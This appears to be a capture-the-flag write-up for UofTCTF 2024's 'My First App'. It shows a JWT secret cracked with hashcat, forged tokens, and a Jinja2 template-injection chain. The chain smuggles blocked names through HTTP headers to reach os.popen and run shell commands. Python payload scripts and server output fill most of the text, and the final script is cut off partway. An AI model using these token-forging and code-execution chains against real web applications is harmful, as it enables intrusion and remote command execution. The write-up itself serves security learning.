---
title: My First App
date: 2024-01-16
tags: 
- web
- author-hartmannsyg
categories: UofTCTF 2024
---

written by {% person hartmannsyg %}

When trying to solve this, I had no real idea what to do, the only injection surface seemed like an SSTI, but the username field was alphanumeric only so I could not use `{{7*7}}`

After reading some solutions, here's what I understand of the challenge, broken down:

## JWT

When you register, it sets a jwt cookie:
{% ccb wrapped:true %}
auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhhcnRtYW5uc3lnIn0.-ri-SlxYrO7FxYtz_jvzYMYLTXhFRyU2HfHqUbOe3wg
{% endccb %}

The jwt uses algorithm HS256 and has the payload:
```
{
  "username": "hartmannsyg"
}
```

Apparently, this jwt was crackable with rockyou.txt:

{% ccb terminal:true lang:bash wrapped:true %}
$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhhcnRtYW5uc3lnIn0.-ri-SlxYrO7FxYtz_jvzYMYLTXhFRyU2HfHqUbOe3wg' > 'jwt'
$ hashcat -a 0 -m 16500 ./jwt ../../rockyou.txt
{% endccb %}

we see that the key is `torontobluejays`. We can now forge jwts.

## SSTI

```python
import requests
import jwt

payload = """{{7*7}}"""

auth = jwt.encode({"username": payload}, "torontobluejays", algorithm="HS256")

response = requests.get('https://uoftctf-my-first-app.chals.io/dashboard', cookies={"auth_token":auth})
print(response.text)
```

which gives us:
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>gg ez</title>
  <link rel="stylesheet" href="/static/style.css">
</head>
<body>

<div class="container">

    <div class="form-container">
    <h1 class="welcome-text">Welcome, 49</h1>
    <p>This is my first app! I'm not much a web developer though, so there isn't much to do here, sorry!</p>

    <form action="/logout" method="post">
        <input type="submit" value="Logout">
    </form>

    </div>

</div>

</body>
</html>
```

We can then try `{{7*'7}}` which gives us `7777777`, confirming that it is python and it is probably jinja2

The 'normal' route is to do `().__class__.__mro__[index]` to get `<class 'object'>`, then `.__subclasses__[index]` to access everything else.

However, the double underscore `__` is blocked.

"Normally", you can bypass this with [request.args](https://0day.work/jinja2-template-injection-filter-bypasses/) but when we try sending url parameters, we get *"Whoa there bucko, did you forget I'm not a web developer? I don't know how to handle parameters yet!"*.

We have no choice but to use headers. However it seems like accessing `request.headers` was blocked. In fact, it seems like we have to do the roundabout `a|b` jinja filtering method to get what we want. 

There are three headers that I found so far that are accessible via [request](https://tedboy.github.io/flask/generated/generated/flask.Request.html) that allows us to bypass, `request.referrer`, `request.pragma`, and `request.mimetype` (for some reason the string `"content_type"` was also blocked so we use `mimetype` instead)

```py
import requests
import jwt
import html

mro = "(request|attr(request.pragma)|attr(request.mimetype))" # request.__class__.__mro__

payload = "{{" + mro + "}}"

headers = {
    "Pragma": "__class__",
    "Content-Type": "__mro__",
}

auth = jwt.encode({"username": payload}, "torontobluejays", algorithm="HS256")

print(payload)

response = requests.get('https://uoftctf-my-first-app.chals.io/dashboard', cookies={"auth_token":auth}, headers=headers)

if '500' in response.text:
    print('Internal Server Error')
elif 'BLOCKED' in response.text:
    print(response.text)
else:
    result = response.text.split('\n')[15][38:-6]
    print(html.unescape(result))
```

We get:


{% ccb wrapped:true lang:python terminal:true %}
(<class 'flask.wrappers.Request'>, <class 'werkzeug.wrappers.request.Request'>, <class 'werkzeug.sansio.request.Request'>, <class 'object'>)
{% endccb %}

we want to access `<class 'object'>`. Unfortunately, `[` and `]` was blocked, so we have to use the `__getitem__` dunder:

```py
mro = "(request|attr(request.pragma)|attr(request.mimetype))" # request.__class__.__mro__
getitem = "request.referrer" # __getitem__
payload = "{{" + f"({mro}|attr({getitem}))(3)" + "}}" # request.__class__.__mro__.__getitem__(3)

headers = {
    "Pragma": "__class__",
    "Content-Type": "__mro__",
    "Referer": "__getitem__",
}
```

We will finally get `<class 'object'>`. We can now smuggle in `__subclasses__()` and then...

## we have ran out of header names

We have appeared to run out of header names. 

One way to solve this (which was the original way by the author) is to use `__getitem__` to import characters, and then use those characters to access the header. Basically, something like:

```py
pragma = "request.pragma"
getitem = "request.referrer"
headers = "request.mimetype"
request_headers = f"(request|attr({headers}))" # request.headers 
pragma_str = f"({pragma}|attr({getitem}))(0)" # HeaderSet(['0123456789']).__getitem__(0) = "0123456789"
zero = f"({pragma_str}|attr({getitem}))(0)" #"0123456789".__getitem__(0) = "0"

# request_headers is https://tedboy.github.io/flask/generated/generated/werkzeug.EnvironHeaders.get.html
payload = "{{" + f"{request_headers}.get({zero})" + "}}" # werkzeug.EnvironHeaders.get()

headers = {
    "Pragma": "0123456789",
    "Referer": "__getitem__",
    "Content-Type": "headers",
    "0": "amogus",
}
```

which gives us the value of the `0` header: "amogus"

## __subclasses__

```py
pragma = "request.pragma"
getitem = "request.referrer"
headers = "request.mimetype"
request_headers = f"(request|attr({headers}))" # request.headers 
pragma_str = f"({pragma}|attr({getitem}))(0)" # HeaderSet(['0123456789']).__getitem__(0) = "0123456789"

zero  = f"({pragma_str}|attr({getitem}))(0)" #"0123456789".__getitem__(0) = "0"
one   = f"({pragma_str}|attr({getitem}))(1)" #"0123456789".__getitem__(1) = "1"
two   = f"({pragma_str}|attr({getitem}))(2)" #"0123456789".__getitem__(2) = "2"
three = f"({pragma_str}|attr({getitem}))(3)" #"0123456789".__getitem__(3) = "3"
four  = f"({pragma_str}|attr({getitem}))(4)" #"0123456789".__getitem__(4) = "4"
five  = f"({pragma_str}|attr({getitem}))(5)" #"0123456789".__getitem__(5) = "5"
six   = f"({pragma_str}|attr({getitem}))(6)" #"0123456789".__getitem__(6) = "6"
seven = f"({pragma_str}|attr({getitem}))(7)" #"0123456789".__getitem__(7) = "7"
eight = f"({pragma_str}|attr({getitem}))(8)" #"0123456789".__getitem__(8) = "8"
nine  = f"({pragma_str}|attr({getitem}))(9)" #"0123456789".__getitem__(9) = "9"

class_dunder = f"{request_headers}.get({zero})" # request.headers.get("0") = "__class__"
mro_dunder = f"{request_headers}.get({one})" # request.headers.get("1") = "__mro__"

mro_tuple = f"request|attr({class_dunder})|attr({mro_dunder})" # request.__class__.__mro__
# this is (<class 'flask.wrappers.Request'>, <class 'werkzeug.wrappers.request.Request'>, <class 'werkzeug.sansio.request.Request'>, <class 'object'>)

class_object = f"({mro_tuple}|attr({getitem}))(3)" # request.__class__.__mro__.__getitem__(3)

subclasses_dunder = f"{request_headers}.get({two})" # request.headers.get("2") = "__subclasses__"
subclasses = f"({class_object}|attr({subclasses_dunder}))()" # <class 'object'>.__subclasses__()

payload = "{{" + subclasses + "}}"

headers = {
    "Pragma": "0123456789",
    "Referer": "__getitem__",
    "Content-Type": "headers",
    "0": "__class__",
    "1": "__mro__",
    "2": "__subclasses__",
}
```

{% ccb lang:py wrapped:true scrollable:true %}
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_distutils_hack._TrivialRe'>, <class '_distutils_hack.DistutilsMetaFinder'>, <class '_distutils_hack.shim'>, <class '__future__._Feature'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'enum.auto'>, <enum 'Enum'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'typing._Final'>, <class 'typing._Immutable'>, <class 'typing._TypeVarLike'>, <class 'typing.Generic'>, <class 'typing._TypingEmpty'>, <class 'typing._TypingEllipsis'>, <class 'typing.Annotated'>, <class 'typing.NamedTuple'>, <class 'typing.TypedDict'>, <class 'typing.NewType'>, <class 'typing.io'>, <class 'typing.re'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class '_socket.socket'>, <class 'array.array'>, <class 'array.arrayiterator'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver._NoThreads'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'datetime.date'>, <class 'datetime.time'>, <class 'datetime.timedelta'>, <class 'datetime.tzinfo'>, <class 'ast.AST'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_random.Random'>, <class '_sha512.sha384'>, <class '_sha512.sha512'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class '_struct.Struct'>, <class '_struct.unpack_iterator'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.SSLSession'>, <class '_ssl.Certificate'>, <class 'ssl.SSLObject'>, <class 'mimetypes.MimeTypes'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'tokenize.Untokenizer'>, <class 'traceback._Sentinel'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'werkzeug._internal._Missing'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.datastructures.mixins.ImmutableListMixin'>, <class 'werkzeug.datastructures.mixins.ImmutableDictMixin'>, <class 'werkzeug.datastructures.mixins.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.structures._omd_bucket'>, <class '_hashlib.HASH'>, <class '_hashlib.HMAC'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'werkzeug.datastructures.auth.Authorization'>, <class 'werkzeug.datastructures.auth.WWWAuthenticate'>, <class 'werkzeug.datastructures.file_storage.FileStorage'>, <class 'werkzeug.datastructures.headers.Headers'>, <class 'werkzeug.datastructures.range.IfRange'>, <class 'werkzeug.datastructures.range.Range'>, <class 'werkzeug.datastructures.range.ContentRange'>, <class 'ast.NodeVisitor'>, <class 'dis.Bytecode'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, <class 'dataclasses._MISSING_TYPE'>, <class 'dataclasses._KW_ONLY_TYPE'>, <class 'dataclasses._FIELD_BASE'>, <class 'dataclasses.InitVar'>, <class 'dataclasses.Field'>, <class 'dataclasses._DataclassParams'>, <class 'werkzeug.sansio.multipart.Event'>, <class 'werkzeug.sansio.multipart.MultipartDecoder'>, <class 'werkzeug.sansio.multipart.MultipartEncoder'>, <class 'importlib._abc.Loader'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'unicodedata.UCD'>, <class 'hmac.HMAC'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.user_agent.UserAgent'>, <class 'werkzeug.sansio.request.Request'>, <class 'werkzeug.sansio.response.Response'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'werkzeug.test.Cookie'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local._ProxyLookup'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'platform._Processor'>, <class 'uuid.UUID'>, <class 'flask.json.provider.JSONProvider'>, <class 'gettext.NullTranslations'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'werkzeug.routing.converters.BaseConverter'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'werkzeug.routing.rules.RulePart'>, <class 'werkzeug.routing.rules.RuleFactory'>, <class 'werkzeug.routing.rules.RuleTemplate'>, <class 'werkzeug.routing.matcher.State'>, <class 'werkzeug.routing.matcher.StateMachineMatcher'>, <class 'werkzeug.routing.map.Map'>, <class 'werkzeug.routing.map.MapAdapter'>, <class '_csv.Dialect'>, <class '_csv.reader'>, <class '_csv.writer'>, <class 'csv.Dialect'>, <class 'csv.DictReader'>, <class 'csv.DictWriter'>, <class 'csv.Sniffer'>, <class 'pathlib._Flavour'>, <class 'pathlib._Accessor'>, <class 'pathlib._Selector'>, <class 'pathlib._TerminatingSelector'>, <class 'pathlib.PurePath'>, <class 'zipfile.ZipInfo'>, <class 'zipfile.LZMACompressor'>, <class 'zipfile.LZMADecompressor'>, <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'zipfile.Path'>, <class 'textwrap.TextWrapper'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.MetaPathFinder'>, <class 'importlib.abc.PathEntryFinder'>, <class 'importlib.abc.ResourceReader'>, <class 'importlib.metadata.Sectioned'>, <class 'importlib.metadata.Deprecated'>, <class 'importlib.metadata.FileHash'>, <class 'importlib.metadata.Distribution'>, <class 'importlib.metadata.DistributionFinder.Context'>, <class 'importlib.metadata.FastPath'>, <class 'importlib.metadata.Lookup'>, <class 'importlib.metadata.Prepared'>, <class 'blinker._saferef.BoundMethodWeakref'>, <class 'blinker._utilities._symbol'>, <class 'blinker._utilities.symbol'>, <class 'blinker._utilities.lazy_property'>, <class 'blinker.base.Signal'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.config.ConfigAttribute'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class '_pickle.Pickler'>, <class '_pickle.Unpickler'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'flask.sansio.scaffold.Scaffold'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous._json._CompactJSON'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'flask.sansio.blueprints.BlueprintSetupState'>, <class 'jwt.api_jwk.PyJWK'>, <class 'jwt.api_jwk.PyJWKSet'>, <class 'jwt.api_jwk.PyJWTSetWithTimestamp'>, <class 'jwt.api_jws.PyJWS'>, <class 'jwt.api_jwt.PyJWT'>, <class 'jwt.jwk_set_cache.JWKSetCache'>, <class 'jwt.jwks_client.PyJWKClient'>]
{% endccb %}

## shell

Unfortunately, it seems like we cannot use the File class to read the flag as the file class is not here. 

In [Hacktricks jinja2 SSTI RCE](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) there are two ideas:

1. use `<class 'subprocess.Popen'>` to run shell (I did not get this to work as I could not call functions with multiple arguments since commas are blocked)
2. use `<class 'warnings.catch_warnings'>` to create an instance of the class then `._module.__builtins__['__import__']('os').popen("ls").read()`


So it seems like we have to do the far longer import os popen method:

```py
catch_warnings = f"({subclasses}|attr({getitem}))(240)" # <class 'object'>.__subclasses__().__getitem__(240) = <class 'warnings.catch_warnings'>
catch_warnings_instance = f"({catch_warnings})()" # <class 'warnings.catch_warnings'>()

_module = f"{request_headers}.get({three})" # request.headers.get("2") = "_module"
module = f"({catch_warnings_instance})|attr({_module})" # <class 'warnings.catch_warnings'>()._module = <module 'warnings' from '/usr/local/lib/python3.10/warnings.py'>

builtins_dunder = f"{request_headers}.get({four})" # request.headers.get("4") = "__builtins__"
builtins = f"{module}|attr({builtins_dunder})" # <class 'warnings.catch_warnings'>()._module.__builtins__

import_dunder = f"{request_headers}.get({five})" # request.headers.get("5") = "__import__"
import_func = f"({builtins}|attr({getitem}))({import_dunder})" # <class 'warnings.catch_warnings'>()._module.__builtins__.__getitem__("__import__") = <built-in function __import__>

os_str = f"{request_headers}.get({six})" # request.headers.get("6") = "os"
os = f"{import_func}({os_str})" # <built-in function __import__>("os") = <module 'os' (frozen)>

popen_str = f"{request_headers}.get({seven})" # request.headers.get("7") = "popen"
popen_func = f"{os}|attr({popen_str})" # <module 'os' (frozen)>.popen

cmd = f"{request_headers}.get({eight})" # request.headers.get("8") = our cmd
popen = f"{popen_func}({cmd})" # <module 'os' (frozen)>.popen(cmd)

read_str = f"{request_headers}.get({nine})" # request.headers.get("9") = "read"
popen_read = f"({popen}|attr({read_str}))()"  # <module 'os' (frozen)>.popen(cmd).read()

payload = "{{" + popen_read + "}}"

headers = {
    "Pragma": "0123456789",
    "Referer": "__getitem__",
    "Content-Type": "headers",
    "0": "__class__",
    "1": "__mro__",
    "2": "__subclasses__",
    "3": "_module",
    "4": "__builtins__",
    "5": "__import__",
    "6": "os",
    "7": "popen",
    "8": "cat flag.txt", # cmd
    "9": "read",
}
```

Our final payload:

{% ccb lang:python wrapped:true %}
(((((((request|attr((request|attr(request.mimetype)).get(((request.pragma|attr(request.referrer))(0)|attr(request.referrer))(0)))|attr((request|attr(request.mimetype)).get(((request.pragma|attr(request.referrer))(0)|attr(request.referrer))(1)))|attr(request.referrer))(3)|attr((request|attr(request.mimetype)).get(((request.pragma|attr(request.referrer))(0)|attr(request.referrer))(2))))()|attr(request.referrer))(240))())|attr((request|attr(request.mimetype)).get(((request.pragma|attr(request.referrer))(0)|attr(request.referrer))(3)))|attr((request|attr(request.mimetype)).get(((request.pragma|attr(request.referrer))(0)|attr(request.referrer))(4)))|attr(request.referrer))((request|attr(request.mimetype)).get(((request.pragma|attr(request.referrer))(0)|attr(request.referrer))(5)))((request|attr(request.mimetype)).get(((request.pragma|attr(request.referrer))(0)|attr(request.referrer))(6)))|attr((request|attr(request.mimetype)).get(((request.pragma|attr(request.referrer))(0)|attr(request.referrer))(7)))((request|attr(request.mimetype)).get(((request.pragma|attr(request.referrer))(0)|attr(request.referrer))(8)))|attr((request|attr(request.mimetype)).get(((request.pragma|attr(request.referrer))(0)|attr(request.referrer))(9))))()
{% endccb %}

Final script:

{% ccb lang:python scrollable:true caption:solve.py %}
import requests
import jwt
import html

pragma = "request.pragma" # "0123456789"
getitem = "request.referrer" # "__getitem__"
headers = "request.mimetype" # "headers"
request_headers = f"(request|attr({headers}))" # request.headers 
pragma_str = f"({pragma}|attr({getitem}))(0)" # HeaderSet(['0123456789']).__getitem__(0) = "0123456789"

zero  = f"({pragma_str}|attr({getitem}))(0)" #"0123456789".__getitem__(0) = "0"
one   = f"({pragma_str}|attr({getitem}))(1)" #"0123456789".__getitem__(1) = "1"
two   = f"({pragma_str}|attr({getitem}))(2)" #"0123456789".__getitem__(2) = "2"
three = f"({pragma_str}|attr({getitem}))(3)" #"0123456789".__getitem__(3) = "3"
four  = f"({pragma_str}|attr({getitem}))(4)" #"0123456789".__getitem__(4) = "4"
five  = f"({pragma_str}|attr({getitem}))(5)" #"0123456789".__getitem__(5) = "5"
six   = f"({pragma_str}|attr({getitem}))(6)" #"0123456789".__getitem__(6) = "6"
seven = f"({pragma_str}|attr({getitem}))(7)" #"0123456789".__getitem__(7) = "7"
eight = f"({pragma_str}|attr({getitem}))(8)" #"0123456789".__getitem__(8) = "8"
nine  = f"({pragma_str}|attr({getitem}))(9)" #"0123456789".__getitem__(9) = "9"

class_dunder = f"{request_headers}.get({zero})" # request.headers.get("0") = "__class__"
mro_dunder = f"{request_headers}.get({one})" # request.headers.get("1") = "__mro__"

mro_tuple = f"request|attr({class_dunder})|attr({mro_dunder})" # request.__class__.__mro__
# this is (<class 'flask.wrappers.Request'>, <class 'werkzeug.wrappers.request.Request'>, <class 'werkzeug.sansio.request.Request'>, <class 'object'>)

class_object = f"({mro_tuple}|attr({getitem}))(3)" # request.__class__.__mro__.__getitem__(3) = <class 'object'>

subclasses_dunder = f"{request_headers}.get({two})" # request.headers.get("2") = "__subclasses__"
subclasses = f"({class_object}|attr({subclasses_dunder}))()" # <class 'object'>.__subclasses__()

catch_warnings = f"({subclasses}|attr({getitem}))(240)" # <class 'object'>.__subclasses__().__getitem__(240) = <class 'warnings.catch_warnings'>
catch_warnings_instance = f"({catch_warnings})()" # <class 'warnings.catch_warnings'>()

_module = f"{request_headers}.get({three})" # request.headers.get("2") = "_module"
module = f"({catch_warnings_instance})|attr({_module})" # <class 'warnings.catch_warnings'>()._module = <module 'warnings' from '/usr/local/lib/python3.10/warnings.py'>

builtins_dunder = f"{request_headers}.get({four})" # request.headers.get("4") = "__builtins__"
builtins = f"{module}|attr({builtins_dunder})" # <class 'warnings.catch_warnings'>()._module.__builtins__

import_dunder = f"{request_headers}.get({five})" # request.headers.get("5") = "__import__"
